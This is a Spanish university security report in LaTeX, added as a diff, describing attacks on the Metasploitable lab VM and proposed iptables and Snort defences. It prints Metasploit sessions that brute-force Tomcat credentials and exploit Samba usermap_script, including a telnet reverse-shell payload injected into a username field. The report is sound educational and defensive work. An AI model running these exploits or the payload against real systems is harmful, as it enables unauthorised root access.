@@ -1,0 +1,501 @@
+\documentclass[a4paper,12pt]{scrartcl}
+\usepackage[spanish]{babel}
+\usepackage[utf8]{inputenc}
+\usepackage{graphicx}
+\usepackage[numbers]{natbib}
+\usepackage{hyperref}
+
+\hypersetup{%
+	pdfborder = {0 0 0}
+}
+
+\usepackage{listings}
+
+%opening
+\title{Informe de seguridad sobre Metasploit}
+\titlehead{\centering\includegraphics[width=15cm]{umu}}
+\author{José Luis Cánovas Sánchez - Ezequiel Santamaría Navarro}
+
+\begin{document}
+
+\pagenumbering{gobble}
+
+\maketitle
+
+\newpage
+
+
+\pagenumbering{arabic}
+\setcounter{page}{1}
+
+\begin{abstract}
+\begin{center}
+	\textbf{Resumen}
+\end{center}
+
+\vspace{10pt}
+
+Informe de seguridad sobre Metasploit, mostrando los riesgos para el sistema y métodos de prevención y detección. 
+\end{abstract}
+
+\newpage
+
+\tableofcontents
+
+\newpage
+
+\section{Introducción}
+
+%TODO: Indicar que además de servicios inseguros habría que estudiar la seguridad del edificio,
+% cableado, puertas, guardias de seguridad, etc...
+
+En este informe describimos una serie de ataques sobre un sistema inseguro, Metasploitable, que tendrá el rol de víctima, desde una máquina en una red externa, el atacante. Inicialmente mostraremos los ataques con éxito, donde no hay (suficientes) medidas de seguridad. Después describiremos las medidas de seguridad software que debería tomar la organización en su red para poder detectar y evitar en la medida de lo posible dichos ataques.
+
+En cuanto a la seguridad física, dependiendo del caso real en que nos encontremos, se deberían tener en cuenta la localización de los equipos, la seguridad de las puertas, el cableado, personal de seguridad, etc.
+
+\section{Topología del sistema}
+
+%TODO: añadir esquema de la topología ideal
+
+\subsection{Topología real}
+
+%TODO: añadir esquema de topología virtual
+%TODO: indicar topología sin protección
+
+\section{Metasploitable}
+
+Metasploitable es una copia de Linux (Ubuntu 8.04 Hardy) con varios errores de seguridad conocidos. Este es el sistema sobre el cual vamos a estudiar e informar. Rapid7 sugiere usar esta distro para practicar antes de realizar un informe de pentesting en un entorno real de producción\cite{metasploitable}.
+
+\vspace{10pt}
+
+La VM de Metasploitable viene preparada para usarse con VMWare o VirtualBox, y se recomienda que en su uso la máquina virtual no se exponga a una red pública no confiable (a internet, por ejemplo), por ello la VM solo tendrá acceso a la máquina real y no a internet como se indica en el esquema de la topología.
+
+\vspace{10pt}
+
+Para hacerlo lo más realista posible, no vamos hacer login en el sistema de Metasploitable, y tampoco vamos a asumir que conocemos el login y el password (msfadmin:msfadmin), que son cosas que en un escenario real no sabríamos.
+
+\section{Servicios inseguros}
+
+%TODO: indicar sin protección
+
+\subsection{Primera toma de contacto}
+
+Para poder empezar a listar los servicios de que dispone la máquina virtual podríamos ir probando uno a uno (servicio web por puerto 80, samba, ftp, ssh...), y deducir versiones de la máquina (si en la cabecera http aparece Apache, qué opciones permite el ftp y el ssh...), pero para ello existe una herramienta automática que aprovecha ciertas funcionalidades en los protocolos para determinar sus versiones (y de las versiones las posibles vulnerabilidades).
+
+\vspace{10pt}
+
+La herramienta se llama nmap, y con una simple orden podemos ver lo siguiente:
+
+\begin{lstlisting}[breaklines]
+$ nmap -A 192.168.59.100
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-17 19:03 CEST
+Nmap scan report for 192.168.59.100
+Host is up (0.000077s latency).
+Not shown: 977 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2010-03-17T14:07:45
+|_Not valid after:  2010-04-16T14:07:45
+|_ssl-date: 2016-05-17T17:04:06+00:00; -3s from scanner time.
+53/tcp   open  domain      ISC BIND 9.4.2
+| dns-nsid: 
+|_  bind.version: 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
+|_http-title: Metasploitable2 - Linux
+111/tcp  open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      43635/udp  mountd
+|   100005  1,2,3      53866/tcp  mountd
+|   100021  1,3,4      55061/tcp  nlockmgr
+|   100021  1,3,4      55111/udp  nlockmgr
+|   100024  1          59684/udp  status
+|_  100024  1          59966/tcp  status
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login
+514/tcp  open  shell       Netkit rshd
+1099/tcp open  java-rmi    Java RMI Registry
+1524/tcp open  shell       Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      43635/udp  mountd
+|   100005  1,2,3      53866/tcp  mountd
+|   100021  1,3,4      55061/tcp  nlockmgr
+|   100021  1,3,4      55111/udp  nlockmgr
+|   100024  1          59684/udp  status
+|_  100024  1          59966/tcp  status
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+| mysql-info: 
+|   Protocol: 53
+|   Version: .0.51a-3ubuntu5
+|   Thread ID: 9
+|   Capabilities flags: 43564
+|   Some Capabilities: Support41Auth, SupportsTransactions, LongColumnFlag, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, SupportsCompression, ConnectWithDatabase
+|   Status: Autocommit
+|_  Salt: ll\deM1KhJyAxZ9MXSx!
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+| vnc-info: 
+|   Protocol version: 3.3
+|   Security types: 
+|_    Unknown security type (33554432)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         Unreal ircd
+| irc-info: 
+|   users: 1
+|   servers: 1
+|   lusers: 1
+|   lservers: 0
+|   server: irc.Metasploitable.LAN
+|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
+|   uptime: 0 days, 0:04:49
+|   source ident: nmap
+|   source host: AD48EF72.45245CED.FFFA6D49.IP
+|_  error: Closing Link: fqqtrzgsu[192.168.59.1] (Quit: fqqtrzgsu)
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/5.5
+Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Host script results:
+|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP
+|_  System time: 2016-05-21T13:04:07-04:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.95 seconds
+\end{lstlisting}
+
+De esta lista nos ha llamado la atención Samba y Tomcat, dos servicios que ya conocemos de antemano y que imaginamos que son más fáciles de vulnerar que los demás.
+
+\vspace{10pt}
+
+Para vulnerar estos servicios hacemos uso de Metasploit, un software de código libre que tiene una extensa base de datos sobre vulnerabilidades y que agiliza el proceso de pentesting ofreciendo lo necesario para vulnerar cada servicio\cite{metasploit}. 
+
+\subsection{Tomcat}
+
+%TODO: ¿Qué es tomcat?
+
+Como indicamos anteriormente usaremos metasploit para intentar vulnerar Tomcat. Si buscamos Tomcat en la bases de datos de metasploit:
+
+\begin{lstlisting}[breaklines]
+Matching Modules
+================
+auxiliary/admin/http/tomcat_administration
+auxiliary/admin/http/tomcat_utf8_traversal
+auxiliary/admin/http/trendmicro_dlp_traversal
+auxiliary/dos/http/apache_commons_fileupload_dos
+auxiliary/dos/http/apache_tomcat_transfer_encoding
+auxiliary/dos/http/hashcollision_dos
+auxiliary/scanner/http/tomcat_enum
+auxiliary/scanner/http/tomcat_mgr_login
+exploit/multi/http/struts_code_exec_classloader
+exploit/multi/http/struts_default_action_mapper
+exploit/multi/http/struts_dev_mode
+exploit/multi/http/tomcat_mgr_deploy
+exploit/multi/http/tomcat_mgr_upload
+exploit/multi/http/zenworks_configuration_management_upload
+post/windows/gather/enum_tomcat
+\end{lstlisting}
+
+Lo primero que queremos hacer es usar un \textit{scanner}. Con los escáneres podemos obtener información de los servicios. Si usamos el escáner $tomcat\_enum$:
+
+
+\begin{lstlisting}[breaklines]
+$ use auxiliary/scanner/http/tomcat_enum
+$ set RHOSTS 192.168.59.100
+$ set RPORT 8180
+$ run
+[*] 192.168.59.100:8180  - /admin/j_security_check - Checking j_security_check...
+[*] 192.168.59.100:8180  - /admin/j_security_check - Server returned: 200
+[*] 192.168.59.100:8180  - [1/6] - /admin/j_security_check - Apache Tomcat - Trying name: 'admin'
+[-] 192.168.59.100:8180  - [1/6] - /admin/j_security_check - Apache Tomcat admin not found
+[...]
+[*] 192.168.59.100:8180  - [6/6] - /admin/j_security_check - Apache Tomcat - Trying name: 'both'
+[-] 192.168.59.100:8180  - [6/6] - /admin/j_security_check - Apache Tomcat both not found
+[*] http://192.168.59.100:8180/admin/j_security_check - No users found.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+\end{lstlisting}
+
+No encontramos usuarios de la lista de usuarios por defecto, así que intentamos con el segundo escáner:
+
+\begin{lstlisting}[breaklines]
+$ use auxiliary/scanner/http/tomcat_mgr_login
+$ set RHOSTS 192.168.59.100
+$ set RPORT 8180
+$ run
+[-] 192.168.59.100:8180 TOMCAT_MGR - LOGIN FAILED: admin:admin (Incorrect: )
+[-] 192.168.59.100:8180 TOMCAT_MGR - LOGIN FAILED: admin:manager (Incorrect: )
+[...]
+[-] 192.168.59.100:8180 TOMCAT_MGR - LOGIN FAILED: tomcat:root (Incorrect: )
+[+] 192.168.59.100:8180 - LOGIN SUCCESSFUL: tomcat:tomcat
+[-] 192.168.59.100:8180 TOMCAT_MGR - LOGIN FAILED: both:admin (Incorrect: )
+[...]
+[-] 192.168.59.100:8180 TOMCAT_MGR - LOGIN FAILED: QCC:QLogic66 (Incorrect: )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+\end{lstlisting}
+
+\vspace{12pt}
+
+Las salidas son muy largas, así que van resumidas. Se puede ver que con el segundo escáner hemos conseguido acceder usando el usuario \textbf{tomcat:tomcat}, que vamos a usar para poder obtener ejecución de código arbitrario posteriormente.
+
+En la búsqueda de Tomcat, en el apartado de exploits podemos ver exploit/multi/http/tomcat\_mgr\_deploy, que tiene un nombre similar al escáner que nos dio un usuario positivo. Si usamos el exploit:
+
+\begin{lstlisting}[breaklines]
+$ use exploit/multi/http/tomcat_mgr_deploy
+$ set RHOST 192.168.59.100
+$ set USERNAME tomcat
+$ set PASSWORD tomcat
+$ set RPORT 8180
+$ run
+
+[*] Started reverse TCP handler on 192.168.59.1:4444 
+[*] Attempting to automatically select a target...
+[*] Automatically selected target "Linux x86"
+[*] Uploading 6071 bytes as wrwe.war ...
+[*] Executing /wrwe/QisKxDzvyVOapxx4PwnS4GOLQ.jsp...
+[*] Undeploying wrwe ...
+[*] Sending stage (46112 bytes) to 192.168.59.100
+[*] Meterpreter session 1 opened (192.168.59.1:4444 -> 192.168.59.100:39310) at 2016-05-22 15:59:27 +0200
+
+meterpreter > getuid
+Server username: tomcat55
+\end{lstlisting}
+
+\noindent Tenemos acceso a un meterpreter\footnote{Meterpreter es una terminal que ofrece acceso remoto a la máquina víctima.} como el usuario tomcat55. A partir de aquí un atacante utilizaría alguna forma de escalar privilegios, para poder acceder como otro usuario (el objetivo final sería acceder como root).
+
+La teoría detrás de la ejecución arbitraria de código como usuario autenticado en el Tomcat Manager se puede encontrar en los siguientes enlaces:
+
+\begin{itemize}
+	\item \hyperref{https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload}{rapid7}{tomcat}{Rapid7, información del exploit en metasploit.}
+	\item \hyperref{http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html#Deploy_A_New_Application_Remotely}{tomcat}{uploadwar}{Cómo subir aplicaciones remotamente a Tomcat 5.5}.
+\end{itemize}
+
+Más que un error en Tomcat, es un error en su configuración, que trae un usuario por defecto, y lo usamos para explotar una funcionalidad que trae Tomcat y que debería ser segura. 
+
+\vspace{10pt}
+
+Los intercambios a nivel de protocolo que están sucediendo los capturamos con Wireshark y podemos ver las siguientes imágenes:
+
+\begin{center}
+\includegraphics[width=1\linewidth]{cap1}
+
+Primer intento de pedir información, fallido por como funciona el HTTP Auth. El código de respuesta 401 significa que hay que autenticarse.
+
+\end{center}
+
+\newpage
+
+\begin{center}
+\includegraphics[width=1\linewidth]{cap2}
+
+Con la cabecera \textbf{Authorization: Basic dg9tY2F0OnRvbWNhdA==}\footnote{En base64 codificado es tomcat:tomcat, el usuario que hemos encontrado} se autoriza a coger la información del servidor.
+
+\end{center}
+
+\newpage
+
+\begin{center}
+	\includegraphics[width=1\linewidth]{cap3-1}
+	Truncamos parte del payload.
+\end{center}
+\begin{center}
+	\includegraphics[width=1\linewidth]{cap3-2}
+	No se pudo subir el payload porque en el PUT no va la cabecera para autenticarse. Este paso pensamos que es totalmente absurdo y se podría saltar directamente al siguiente paso.
+\end{center}
+
+\newpage
+
+\begin{center}
+	\includegraphics[width=1\linewidth]{cap4-1}
+\end{center}
+\begin{center}
+	\includegraphics[width=1\linewidth]{cap4-2}
+	Mismo paso que en la página anterior, solo que aquí si va la cabecera \textit{Authorization}. A partir de aquí el payload está subido, y se puede ejecutar para obtener una sesión de meterpreter. 
+\end{center}
+
+No analizamos las trazas de la sesión meterpreter porque no viajan en formato humanamente legible. Probablemente viaje código serializado en Java para la máquina virtual en Tomcat. Sin embargo, sí que analizamos el saludo a 3 pasos de la conexión TCP de la sesión:
+
+\newpage
+
+\begin{center}
+	\includegraphics[width=1\linewidth]{cap5}
+	La conexión la inicia la víctima hacia el PC del atacante. Esto habrá que tenerlo en cuenta a la hora de instalar iptables para evitarlo.
+\end{center}
+
+\subsection{Samba}
+
+%TODO: ¿Qué es samba?
+
+Si realizamos el mismo proceso con Samba que con Tomcat, empezaríamos buscando en la base de datos de Metasploit herramientas relacionadas con samba, empezando por los escáneres. Sin embargo, de los escáneres de Samba no hemos obtenido ningún dato relevante como sucedió con Tomcat. Después de probar varias herramientas\footnote{Se puede hacer búsqueda con \textbf{search smb} y \textbf{search samba}}, damos con una que nos permite la ejecución arbitraria de código, ¡como root!
+
+\begin{lstlisting}[breaklines]
+> use exploit/multi/samba/usermap_script 
+> set RHOST 192.168.59.100
+> exploit
+
+[*] Started reverse TCP double handler on 192.168.59.1:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo jccnjDkHvTQNpLTH;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "jccnjDkHvTQNpLTH\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.59.1:4444 -> 192.168.59.100:58336) at 2016-05-23 13:31:24 +0200
+
+id
+uid=0(root) gid=0(root)
+\end{lstlisting}
+
+Si buscamos acerca del exploit que permite esto, encontramos lo siguiente:
+
+\vspace{10pt}
+
+This module exploits a command execution vulerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!\cite{rapid7-userscriptsamba}
+
+\vspace{10pt}
+
+En la descripción previa de Rapid7 hay información suficiente para intentar destripar con Wireshark el protocolo y buscar esos metacaracteres shell:
+
+\begin{center}
+	\includegraphics[width=1\linewidth]{cap6}
+	\includegraphics[width=1\linewidth]{cap7}
+\end{center}
+
+Vemos que usa en el campo usuario el siguiente texto:
+
+\begin{lstlisting}[breaklines]
+/=`nohup sh -c '(sleep 3870|telnet 192.168.59.1 4444|while : ; do sh && break; done 2>&1|telnet 192.168.59.1 4444 >/dev/null 2>&1 &)'`
+\end{lstlisting}
+
+%TODO: Latex no imprime bien las comillas 
+
+Ese usuario introduciría una orden como el usuario que controla Samba para conectar una terminal sh a un servidor de telnet alojado en la máquina atacante puerto 4444. Como samba está controlado por root, la terminal que se ejecuta tiene id=0, permitiendo el nivel máximo de administración. Este fallo estaría clasificado como Injection (aunque no SQL).
+
+\vspace{10pt}
+
+En teoría, uno podría ejecutar cualquier orden a través de estas peticiones, aunque ejecutar una terminal a través de telnet ya ofrece funcionalidad para poder ejecutar lo que haga falta, desde subir nuevos programas usando cat hasta ejecutarlos como root.
+
+\vspace{10pt}
+
+Recordamos que, al igual que con Tomcat, la orden \textbf{telnet 192.168.59.1 4444} inicia la conexión desde la víctima hacia el atacante, punto importante para iptables.
+
+\section{Prevención de ataques}
+
+En lo siguiente, vamos a indicar como detectar y/o prevenir los ataques anteriores y posiblemente algún otro ataque similar.
+
+%TODO: tomcat debería cambiar el usuario por defecto ffs.
+
+\vspace{10pt}
+
+Como los ataques usan internet como vector de transmisión, centraremos el esfuerzo en filtrar e inspeccionar paquetes que viajan por la red, aunque no es la única forma de intrusión (por ejemplo, a través de USB) es la más común (todos los dispositivos actuales hacen uso de internet).
+
+\subsection{Firewall - iptables}
+
+Como hemos visto en los dos ataques a Tomcat y Samba, los \textit{payloads} suelen conectarse al atacante. Desde un punto de vista TCP, el que escucha a un puerto es el atacante, y la parte que inicia con SYN es la víctima. 
+
+\vspace{10pt}
+
+Bloquear las conexiones salientes en un servidor evitaría este tipo de ejecuciones remotas. En un servidor bloquear las conexiones salientes no debería ser un problema, ya que deberían estar escuchando para ofrecer servicios, y salvo excepciones muy concretas (conexiones a servidores de datos ajenos, por ejemplo) podemos filtrar todas las conexiones salientes.
+
+\vspace{10pt}
+
+
+\begin{lstlisting}[breaklines]
+# Con una regla es suficiente
+iptables -A OUTPUT -p tcp -m multiport -m tcp -m state --state NEW --sports 1025:65535 -j DROP
+\end{lstlisting}
+
+\vspace{10pt}
+
+Cabe destacar que estas iptables solo se lo ponen más difícil al atacante para obtener información; no bloquean la ejecución arbitraria de código, pero sí dejan al atacante sin saber nada del otro extremo. Por ejemplo, no podría obtener información a través de cat, ls, ps, etc... Por otro lado, como Samba User Script Map permite la ejecución de código arbitrario con id=0, el atacante podría añadir una regla ACCEPT a un puerto en concreto en las iptables para hacer una conexión concreta, así que solo nos protegería parcialmente.
+
+\vspace{10pt}
+
+Podríamos bloquear con iptables los servicios Samba y Tomcat, pero eso equivale a una denegación de servicio y no sería aceptable, habiendo soluciones mucho mejores al problema.
+
+\vspace{10pt}
+
+\noindent Si repetimos el ataque a tomcat con las reglas:
+
+\begin{verbatim}
+[*] Started reverse TCP handler on 192.168.59.1:4444 
+[*] Attempting to automatically select a target...
+[*] Automatically selected target "Linux x86"
+[*] Uploading 6073 bytes as hHyuIwdjI.war ...
+[*] Executing /hHyuIwdjI/T2OpzLczWat4TUoh5yGiVtO5y.jsp...
+[*] Undeploying hHyuIwdjI ...
+[*] Exploit completed, but no session was created.
+\end{verbatim}
+
+\noindent Vemos que efectivamente se sigue siendo vulnerable pero ya no hay sesión. Si repetimos la prueba de samba:
+
+\begin{verbatim}
+[*] Started reverse TCP double handler on 192.168.59.1:4444 
+[*] Exploit completed, but no session was created.
+\end{verbatim}
+
+Algo va mal, no se ha creado ninguna sesión, debido a que las conexiones salientes nuevas no se admiten. Repetimos que esto solo previene parte del ataque.
+
+\subsection{Predicción de ataques - Snort}
+
+%TODO: ¿Qué es snort?
+
+
+%TODO: revisar esta sección
+En la sección anterior hemos visto trozos de trazas en Wireshark que nos pueden servir de firmas para detectar ataques. Podemos configurar snort para que avise de ciertos patrones en intercambios de información a través de la red. También podría actuar en base a ciertas reglas, como bloqueando el tráfico, instalando nuevas iptables, reiniciando la máquina, etc..., aunque se recomienda no hacerlo porque podrían atacantes mandar tráfico para activar esas órdenes. 
+
+%TODO: Snort para detectar nmap
+
+%TODO: Snort para detectar Meterpreter
+
+%TODO: Snort para detectar /= en el Auth de Samba
+
+Si repetimos las pruebas (desactivando iptables) snort reacciona de la siguiente manera:
+
+%TODO: repetir pruebas SIN iptables pero con snort
+
+\section{Conclusiones}
+
+%TODO: jl rellena pls
+
+\bibliographystyle{amsplain}
+\bibliography{memoria}
+
+\end{document}
